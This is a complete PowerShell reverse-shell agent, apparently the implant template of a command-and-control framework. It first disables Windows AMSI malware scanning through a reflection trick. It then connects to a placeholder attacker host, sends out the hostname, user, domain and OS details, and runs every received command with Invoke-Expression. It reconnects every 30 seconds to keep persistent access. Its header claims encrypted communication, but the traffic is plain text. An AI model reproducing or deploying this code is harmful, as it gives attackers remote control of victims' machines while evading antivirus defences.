# C2PY Advanced PowerShell Agent
# AMSI Bypass + Encrypted Communication

$ErrorActionPreference = "SilentlyContinue"

# AMSI Bypass
try {
    $amsiContext = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $amsiField = $amsiContext.GetField('amsiInitFailed','NonPublic,Static')
    $amsiField.SetValue($null,$true)
} catch {}

# Configuration
$LHOST = "REPLACE_WITH_LHOST"
$LPORT = REPLACE_WITH_LPORT

function Connect-C2 {
    param(
        [string]$RemoteHost,
        [int]$RemotePort,
        [bool]$Persistent = $true
    )
    
    while ($true) {
        try {
            # Create TCP client
            $client = New-Object System.Net.Sockets.TCPClient($RemoteHost, $RemotePort)
            $stream = $client.GetStream()
            
            # Send initial info
            try {
                $computerInfo = @{
                    hostname = $env:COMPUTERNAME
                    user = $env:USERNAME
                    domain = $env:USERDOMAIN
                    os = (Get-WmiObject Win32_OperatingSystem).Caption
                    architecture = $env:PROCESSOR_ARCHITECTURE
                } | ConvertTo-Json
                
                $infoBytes = [System.Text.Encoding]::UTF8.GetBytes($computerInfo)
                $stream.Write($infoBytes, 0, $infoBytes.Length)
                $stream.Flush()
            } catch {}
            
            # Command loop
            [byte[]]$buffer = 0..65535|%{0}
            
            while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
                $command = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $bytesRead)
                
                if ($command.Trim().ToLower() -eq "exit") {
                    break
                }
                
                # Execute command
                try {
                    $output = Invoke-Expression $command 2>&1 | Out-String
                } catch {
                    $output = $_.Exception.Message
                }
                
                # Send response
                $output = $output + "`nPS " + (Get-Location).Path + "> "
                $responseBytes = [System.Text.Encoding]::UTF8.GetBytes($output)
                $stream.Write($responseBytes, 0, $responseBytes.Length)
                $stream.Flush()
            }
            
            $stream.Close()
            $client.Close()
            
            if (-not $Persistent) {
                break
            }
            
        } catch {
            if ($Persistent) {
                Start-Sleep -Seconds 30
                continue
            } else {
                break
            }
        }
        
        if (-not $Persistent) {
            break
        }
    }
}

# Start connection with persistence
Connect-C2 -RemoteHost $LHOST -RemotePort $LPORT -Persistent $true
